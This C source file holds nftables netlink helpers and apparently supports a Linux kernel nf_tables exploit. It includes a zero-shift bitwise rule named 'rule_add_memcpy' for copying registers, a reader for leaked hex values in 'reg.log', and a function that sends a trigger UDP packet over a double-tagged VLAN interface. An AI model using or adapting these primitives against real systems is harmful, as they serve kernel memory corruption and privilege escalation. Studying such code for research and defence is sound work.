/*
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * David Bouman (pql) wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.   Signed, David.
 * ----------------------------------------------------------------------------
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/expr.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <fcntl.h>
#include <limits.h>

#include "helpers.h"

unsigned long read_from_file(int line) {
    int fd;
    char buf[20];
    unsigned long result;
    char *endptr;
    
    fd = open("reg.log", O_RDONLY);
    if (fd == -1) {
        perror("open");
        exit(1);
    }

    if (read(fd, buf, sizeof(buf)) == -1) {
        perror("read");
        close(fd);
        exit(1);
    }

    if (line == 1 && read(fd, buf, sizeof(buf)) == -1) {
        perror("read");
        close(fd);
        exit(1);
    }
    
    result = strtoul(buf, &endptr, 16);
    if (result == ULONG_MAX && endptr == buf) {
        fprintf(stderr, "strtoul: invalid argument\n");
        close(fd);
        exit(1);
    }
    close(fd);
    return result;
}

static uint64_t default_batch_req_handler(struct mnl_socket* nl, int portid, int table_seq)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];

    int ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));

    while (ret > 0) {
        ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL);
        if (ret <= 0) break;
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    }
    return ret;
}

int64_t send_batch_request(struct mnl_socket* nl, uint16_t msg, uint16_t msg_flags, uint16_t family, void** object, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct mnl_nlmsg_batch* batch = mnl_nlmsg_batch_start(buf, sizeof buf);
    uint8_t msg_type = msg & 0xff;
    uint8_t nft_type = (msg >> 8) & 0xff;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), (*seq)++);
    mnl_nlmsg_batch_next(batch);
    int table_seq = *seq;
    struct nlmsghdr* nlh;

    if (result_handler == NULL) {
        result_handler = default_batch_req_handler;
    }

    if (msg == NFT_MSG_NEWSET) {
        nlh = nftnl_set_nlmsg_build_hdr(
            mnl_nlmsg_batch_current(batch),
            NFT_MSG_NEWSET, family,
            msg_flags | NLM_F_ACK, (*seq)++);
    } else {
        nlh = nftnl_nlmsg_build_hdr(
            mnl_nlmsg_batch_current(batch),
            msg_type, family,
            msg_flags | NLM_F_ACK, (*seq)++
        );
    }
    if (msg == NFT_MSG_NEWSET) {
        nftnl_set_nlmsg_build_payload(nlh, *object);
        nftnl_set_free(*object);
    } else {
        switch(nft_type) {
            case NFT_TYPE_TABLE:
                nftnl_table_nlmsg_build_payload(nlh, *object);
                nftnl_table_free(*object);
                break;
            case NFT_TYPE_CHAIN:
                nftnl_chain_nlmsg_build_payload(nlh, *object);
                nftnl_chain_free(*object);
                break;
            case NFT_TYPE_RULE:
                nftnl_rule_nlmsg_build_payload(nlh, *object);
                // offload mnl_attr_put_u32(nlh, NFTA_CHAIN_FLAGS, htonl(2));
                nftnl_rule_free(*object);
                break;
            default:
                return -1;
        }  
    }

    *object = NULL;

    mnl_nlmsg_batch_next(batch);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), (*seq)++);
    mnl_nlmsg_batch_next(batch);

    int ret = mnl_socket_sendto(
        nl,
        mnl_nlmsg_batch_head(batch),
        mnl_nlmsg_batch_size(batch)
    );

    if (ret < 0) {
        perror("mnl_socket_send");
        return -1;
    }

    int portid = mnl_socket_get_portid(nl);

    mnl_nlmsg_batch_stop(batch);

    result_handler(nl, portid, table_seq);
}

struct nftnl_table* build_table(char* name, uint16_t family)
{
    struct nftnl_table* t = nftnl_table_alloc();
    
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

    return t;
}

struct nftnl_chain* build_chain(char* table_name, char* chain_name, char *dev_name, struct unft_base_chain_param* base_param)
{
    struct nftnl_chain* c;

    c = nftnl_chain_alloc();

    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table_name);
    if (dev_name) 
        nftnl_chain_set_str(c, NFTNL_CHAIN_DEV, dev_name);

    if (base_param) {
        nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, base_param->hook_num);
        nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, base_param->prio);
    }

    return c;
}

struct nftnl_rule* build_rule(char* table_name, char* chain_name, uint16_t family, uint64_t* handle)
{
    struct nftnl_rule* r = NULL;
    uint8_t proto;
    
    r = nftnl_rule_alloc();

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
    
    if (handle) {
        nftnl_rule_set_u64(r, NFTNL_RULE_POSITION, *handle);
    }

    return r;
}

struct nftnl_set* build_set(char *table_name, char *set_name, uint16_t family)
{
    // Create a new set object
    struct nftnl_set *set = nftnl_set_alloc();

    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_MAP);
    nftnl_set_set_u32(set, NFTNL_SET_DATA_TYPE, NFT_DATA_VALUE);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 4);
    nftnl_set_set_u32(set, NFTNL_SET_DATA_LEN, 4);
    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set, NFTNL_SET_ID, 1);

    //nftnl_set_add_expr(set, expr);
    return set;
}

#define NFTA_BITWISE_OP NFTA_BITWISE_XOR + 1
#define NFTA_BITWISE_DATA NFTA_BITWISE_OP + 1

void rule_add_bit_shift(
    struct nftnl_rule* r, uint32_t shift_type, uint32_t bitwise_len,
    uint32_t bitwise_sreg, uint32_t bitwise_dreg, void* data, uint32_t data_len)
{
    
    if(bitwise_len > 0xff) {
        puts("bitwise_len > 0xff");
        exit(EXIT_FAILURE);
    }

    struct nftnl_expr* e;
    e = nftnl_expr_alloc("bitwise");

    nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, bitwise_sreg);
    nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, bitwise_dreg);
    nftnl_expr_set_u32(e, NFTA_BITWISE_OP, shift_type);
    nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, bitwise_len);
    nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void rule_add_memcpy(struct nftnl_rule* r, uint32_t len, uint32_t sreg, uint32_t dreg)
{
    uint32_t data = 0;
    rule_add_bit_shift(r, NFT_BITWISE_LSHIFT, len, sreg, dreg, &data, sizeof(data));
}

void rule_add_dynset(struct nftnl_rule* r, char *set_name, uint32_t reg_key, uint32_t reg_data)
{
    struct nftnl_expr *expr = nftnl_expr_alloc("dynset");
    nftnl_expr_set_str(expr, NFTNL_EXPR_DYNSET_SET_NAME, set_name);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_DYNSET_OP, NFT_DYNSET_OP_UPDATE);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_DYNSET_SET_ID, 1);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_DYNSET_SREG_KEY, reg_key);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_DYNSET_SREG_DATA, reg_data);
    nftnl_rule_add_expr(r, expr);
}

void rule_add_lookup(struct nftnl_rule* r, char *set_name, uint32_t reg_key, uint32_t reg_data)
{
    struct nftnl_expr *expr = nftnl_expr_alloc("lookup");
    nftnl_expr_set_str(expr, NFTNL_EXPR_LOOKUP_SET, set_name);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_LOOKUP_SET_ID, 1);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_LOOKUP_SREG, reg_key);
    nftnl_expr_set_u32(expr, NFTNL_EXPR_LOOKUP_DREG, reg_data);
    nftnl_rule_add_expr(r, expr);
}

void rule_add_payload(struct nftnl_rule* r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("payload");

    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);

    nftnl_rule_add_expr(r, e);
}

void rule_add_cmp(struct nftnl_rule* r, uint32_t op, uint32_t sreg, void* data, size_t data_len)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("cmp");

    nftnl_expr_set_u32(e, NFTA_CMP_OP, op);
    nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
    nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void rule_add_immediate_data(struct nftnl_rule* r, uint32_t dreg, void* data, size_t data_len)
{
    struct nftnl_expr* e;
    
    e = nftnl_expr_alloc("immediate");

    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, dreg);
    nftnl_expr_set_data(e, NFTA_IMMEDIATE_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void rule_add_immediate_verdict(struct nftnl_rule* r, uint32_t verdict, char* chain_name)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("immediate");

    // dreg = 0 -> verdict
    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, NFT_REG_VERDICT); 
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict);
    if (verdict == NFT_GOTO || verdict == NFT_JUMP) {
        nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain_name);
    }

    nftnl_rule_add_expr(r, e);
}

int create_table(struct mnl_socket* nl, char* name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_table* t = build_table(name, family);

    return send_batch_request(
        nl,
        NFT_MSG_NEWTABLE | (NFT_TYPE_TABLE << 8),
        NLM_F_CREATE, family, (void**)&t, seq,
        result_handler
    );
}

int create_set(struct mnl_socket* nl, char *table_name, char* name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_set* s = build_set(table_name, name, family);
    
    return send_batch_request(
        nl,
        NFT_MSG_NEWSET,
        NLM_F_CREATE, family, (void**)&s, seq,
        result_handler
    );
}

int create_chain(struct mnl_socket* nl, char* chain_name, char* table_name, char* dev_name, uint16_t family, struct unft_base_chain_param* base_param, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_chain* c = build_chain(chain_name, table_name, dev_name, base_param);

    return send_batch_request(
        nl,
        NFT_MSG_NEWCHAIN | (NFT_TYPE_CHAIN << 8),
        NLM_F_CREATE, family, (void**)&c, seq,
        result_handler  
    );
}

int send_packet() 
{
    int sockfd;
    struct sockaddr_in addr;
    char buffer[] = "This is a test message";
    char *interface_name = "vlan.10";  // double-tagged packet
    int interface_index;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    memcpy(ifr.ifr_name, interface_name, MIN(strlen(interface_name) + 1, sizeof(ifr.ifr_name)));

    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("[-] Error creating socket");
        return 1;
    }
 
    // Set the SO_BINDTODEVICE socket option
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
        perror("[-] Error setting SO_BINDTODEVICE socket option");
        return 1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.123.123");  // random destination
    addr.sin_port = htons(1337); 
    
    // Send the UDP packet
    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("[-] Error sending UDP packet");
        return 1;
    }

    close(sockfd);
    return 0;
}